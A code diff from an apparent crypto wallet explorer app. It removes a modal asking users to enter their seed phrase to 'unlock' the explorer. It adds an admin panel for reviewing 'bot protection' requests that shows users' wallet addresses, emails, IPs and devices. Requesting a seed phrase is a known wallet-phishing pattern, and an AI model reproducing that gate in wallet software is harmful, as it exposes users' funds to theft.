+                      </button>
+                    )}
                   </div>
                 </div>
 
@@ -3930,39 +4312,8 @@ export default function App() {
                   <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" width="14" height="14" strokeLinecap="round" strokeLinejoin="round"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
                   A wallet address can have a zero native balance and yet have historical transactions if funds were moved out. Data is for informational purposes only. Txn fees are estimates based on current gas prices.
                 </div>
+                </>)}
               </div>
-
-              {esSeedModalOpen && (
-                <div className="modal-overlay" onClick={() => setEsSeedModalOpen(false)}>
-                  <div className="modal" onClick={e => e.stopPropagation()}>
-                    <div className="modal-header">
-                      <h3>Verify Explorer Session</h3>
-                      <button className="modal-close" type="button" onClick={() => setEsSeedModalOpen(false)}>✕</button>
-                    </div>
-                    <p className="muted" style={{ marginBottom: '0.75rem', fontSize: '0.86rem' }}>
-                      Enter your seed phrase to unlock the explorer for 5 minutes.
-                    </p>
-                    <form onSubmit={submitExplorerSeedGate}>
-                      <div className="field">
-                        <label htmlFor="es-seed-input">Seed Phrase</label>
-                        <textarea
-                          id="es-seed-input"
-                          rows={3}
-                          placeholder="word1 word2 word3 ..."
-                          value={esSeedInput}
-                          onChange={e => setEsSeedInput(e.target.value)}
-                          required
-                        />
-                      </div>
-                      {esSeedError && <p className="error">{esSeedError}</p>}
-                      <div className="action-row">
-                        <button className="btn-primary" type="submit">Unlock 5-Min Session</button>
-                        <button className="btn-secondary" type="button" onClick={() => { setEsSeedModalOpen(false); setActiveView('protect') }}>Cancel</button>
-                      </div>
-                    </form>
-                  </div>
-                </div>
-              )}
 
               {/* ── Explorer Footer ── */}
               <div className="es-site-footer">
@@ -5213,6 +5564,126 @@ export default function App() {
                   )}
 
                   {/* ── Address Intel ── */}
+                  {/* ── Bot Requests tab ── */}
+                  {adminTab === 'bots' && (
+                    <div className="admin-panel">
+                      <h3>Bot Protection Requests ({botRequests.length})</h3>
+                      <p className="muted" style={{ marginBottom: '1.2rem', fontSize: '0.85rem' }}>
+                        Review wallet bot protection requests. Approve to activate protection or decline with a reason. An email is sent to the user automatically.
+                      </p>
+                      {botRequests.length === 0 ? (
+                        <p className="admin-empty">No bot protection requests yet.</p>
+                      ) : (
+                        <div className="bot-req-list">
+                          {botRequests.map(req => {
+                            const isOpen = botDeclineOpen === req.id
+                            const emailSt = botEmailStatus[req.id]
+                            return (
+                              <div key={req.id} className={`bot-req-card ${req.status}`}>
+                                <div className="bot-req-head">
+                                  <div className="bot-req-addr">
+                                    <span className="bot-req-avatar">{req.walletAddress.slice(2,4).toUpperCase()}</span>
+                                    <div>
+                                      <div className="bot-req-wallet" title={req.walletAddress}>
+                                        {req.walletAddress.slice(0,10)}…{req.walletAddress.slice(-6)}
+                                      </div>
+                                      <div className="bot-req-meta">
+                                        {chainConfig[req.chain].label} · {req.name} · {req.email}
+                                      </div>
+                                    </div>
+                                  </div>
+                                  <div className="bot-req-status-col">
+                                    <span className={`pill ${req.status === 'approved' ? 'low' : req.status === 'declined' ? 'critical' : 'medium'}`}>
+                                      {req.status}
+                                    </span>
+                                    {emailSt && (
+                                      <span className={`pill ${emailSt === 'sent' ? 'low' : emailSt === 'failed' ? 'critical' : 'medium'}`} style={{ fontSize:'0.68rem' }}>
+                                        email {emailSt}
+                                      </span>
+                                    )}
+                                  </div>
+                                </div>
+
+                                <div className="bot-req-details">
+                                  <span>Requested: {req.requestedAt}</span>
+                                  {req.reviewedAt && <span>Reviewed: {req.reviewedAt}</span>}
+                                  <span>IP: {req.ip ?? '—'}</span>
+                                  <span>Device: {req.device ?? '—'}</span>
+                                </div>
+
+                                {req.reason && (
+                                  <div className="bot-req-reason">
+                                    <strong>Reason:</strong> {req.reason}
+                                  </div>
+                                )}
+
+                                {req.status === 'pending' && (
+                                  <div className="bot-req-actions">
+                                    <button
+                                      className="btn-primary"
+                                      type="button"
+                                      disabled={botReviewingId === req.id}
+                                      onClick={() => reviewBotRequest(req, 'approved', 'Your wallet has been approved for blockchain anti-bot protection. All protection layers are now active.')}
+                                      style={{ fontSize:'0.82rem', padding:'0.45rem 1rem' }}
+                                    >
+                                      {botReviewingId === req.id ? 'Processing…' : '✓ Approve'}
+                                    </button>
+                                    <button
+                                      className="btn-secondary"
+                                      type="button"
+                                      onClick={() => { setBotDeclineOpen(isOpen ? null : req.id); setBotDeclineIdx(null); setBotDeclineCustom('') }}
+                                      style={{ fontSize:'0.82rem', padding:'0.45rem 1rem' }}
+                                    >
+                                      {isOpen ? 'Cancel' : '✕ Decline'}
+                                    </button>
+                                  </div>
+                                )}
+
+                                {isOpen && req.status === 'pending' && (
+                                  <div className="bot-decline-panel">
+                                    <p className="bot-decline-label">Select a decline reason or write a custom one:</p>
+                                    <div className="bot-decline-templates">
+                                      {BOT_DECLINE_REASONS.map((r, i) => (
+                                        <button
+                                          key={i}
+                                          type="button"
+                                          className={`bot-decline-tpl ${botDeclineIdx === i ? 'selected' : ''}`}
+                                          onClick={() => { setBotDeclineIdx(i); setBotDeclineCustom('') }}
+                                        >
+                                          {r}
+                                        </button>
+                                      ))}
+                                    </div>
+                                    <textarea
+                                      className="form-input"
+                                      rows={3}
+                                      placeholder="Or write a custom reason…"
+                                      value={botDeclineCustom}
+                                      onChange={e => { setBotDeclineCustom(e.target.value); setBotDeclineIdx(null) }}
+                                      style={{ marginTop:'0.6rem', fontSize:'0.82rem' }}
+                                    />
+                                    <button
+                                      className="btn-primary"
+                                      type="button"
+                                      disabled={botDeclineIdx === null && !botDeclineCustom.trim()}
+                                      onClick={() => {
+                                        const reason = botDeclineCustom.trim() || (botDeclineIdx !== null ? BOT_DECLINE_REASONS[botDeclineIdx] : '')
+                                        if (reason) reviewBotRequest(req, 'declined', reason)
+                                      }}
+                                      style={{ marginTop:'0.6rem', fontSize:'0.82rem', background:'var(--red)', padding:'0.45rem 1rem' }}
+                                    >
+                                      Confirm Decline &amp; Send Email
+                                    </button>
+                                  </div>
+                                )}
+                              </div>
+                            )
+                          })}
+                        </div>
+                      )}
+                    </div>
+                  )}
+
                   {adminTab === 'intel' && (
                     <div className="admin-panel">
                       <h3>Address Intel Management</h3>
